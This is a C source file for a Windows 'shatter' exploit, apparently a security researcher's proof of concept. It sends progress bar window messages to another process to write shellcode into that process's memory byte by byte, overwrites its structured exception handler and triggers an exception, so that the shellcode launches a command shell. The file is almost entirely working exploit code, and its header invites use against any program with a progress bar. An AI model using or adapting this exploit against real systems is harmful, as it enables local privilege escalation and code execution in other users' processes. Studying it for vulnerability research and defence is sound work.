/***************************************************************************
* Progress Control Shatter exploit
*
* Demonstrates the use of Progress Control messages to;
* - inject shellcode to known location
* - overwrite 4 bytes of a critical memory address
*
* 3 Variables need to be set for proper execution.
* - tWindow is the title of the programs main window
* - sehHandler is the critical address to overwrite
* - shellcodeaddr is the data space to inject the code
*
* Local shellcode loads relevant addresses
* Try it out against any program with a progress bar
*
* Based on (and pretty much identical to)
*	mcafee-shatterseh2.c by
*   Oliver Lavery <oliver.lavery at sympatico.ca>
****************************************************************************
/
#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
// Local Cmd Shellcode.
BYTE exploit[] =
"\x90\x68\x74\x76\x73\x6D\x68\x63\x72\x00\x00\x54\xB9\x61\xD9\xE7\x77\xFF\xD
1\x68\x63\x6D\x64\x00\x54\xB9\x44\x80\xC2\x77\xFF\xD1\xCC";
char g_classNameBuf[ 256 ];
char tWindow[]="Checking Disk C:\\";// The name of the main window
long sehHandler = 0x7fXXXXXX; // Critical Address To Overwrite
long shellcodeaddr = 0x7fXXXXXX; // Known Writeable Space Or Global Space
void doWrite(HWND hWnd, long tByte,long address);
void IterateWindows(long hWnd);
int main(int argc, char *argv[])
{
   long hWnd;
   HMODULE hMod;
   DWORD ProcAddr;
   printf("%% Playing with progress bar messages\n");
   printf("%% brett.moore@security-assessment.com\n\n");
   // Find local procedure address
   hMod = LoadLibrary("kernel32.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "LoadLibraryA");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[13] = ProcAddr;
   hMod = LoadLibrary("msvcrt.dll");
   ProcAddr = (DWORD)GetProcAddress(hMod, "system");
   if(ProcAddr != 0)
      // And put it in our shellcode
      *(long *)&exploit[26] = ProcAddr;

   printf("+ Finding %s Window...\n",tWindow);
   hWnd = (long)FindWindow(NULL,tWindow);
   if(hWnd == NULL)
   {
      printf("+ Couldn't Find %s Window\n",tWindow);
      return 0;
   }
   printf("+ Found Main Window At...0x%xh\n",hWnd);
   IterateWindows(hWnd);
   printf("+ Done...\n");
   return 0;
}
void doWrite(HWND hWnd, long tByte,long address)
{
   SendMessage( hWnd,(UINT) PBM_SETRANGE,0,MAKELPARAM(tByte , 20));
   SendMessage( hWnd,(UINT) PBM_GETRANGE,1,address);
}
void IterateWindows(long hWnd)
{
   long childhWnd,looper;
   childhWnd = (long)GetNextWindow((HWND)hWnd,GW_CHILD);
   while (childhWnd != NULL)
   {
      IterateWindows(childhWnd);
      childhWnd = (long)GetNextWindow((HWND)childhWnd ,GW_HWNDNEXT);
   }
   GetClassName( (HWND)hWnd, g_classNameBuf, sizeof(g_classNameBuf) );
   if ( strcmp(g_classNameBuf, "msctls_progress32") ==0)
   {
	  // Inject shellcode to known address
	  printf("+ Sending shellcode to...0x%xh\n",shellcodeaddr);
	  for (looper=0;looper<sizeof(exploit);looper++)
		 doWrite((HWND)hWnd, (long) exploit[looper],(shellcodeaddr + looper));
	  // Overwrite SEH
	  printf("+ Overwriting Top SEH....0x%xh\n",sehHandler);
	  doWrite((HWND)hWnd, ((shellcodeaddr) & 0xff),sehHandler);
	  doWrite((HWND)hWnd, ((shellcodeaddr >> 8) & 0xff),sehHandler+1);
	  doWrite((HWND)hWnd, ((shellcodeaddr >> 16) & 0xff),sehHandler+2);
	  doWrite((HWND)hWnd, ((shellcodeaddr >> 24) & 0xff),sehHandler+3);
	  // Cause exception
	  printf("+ Forcing Unhandled Exception\n");
	  SendMessage((HWND) hWnd,(UINT) PBM_GETRANGE,0,1);
	  printf("+ Done...\n");
	  exit(0);
	}
}
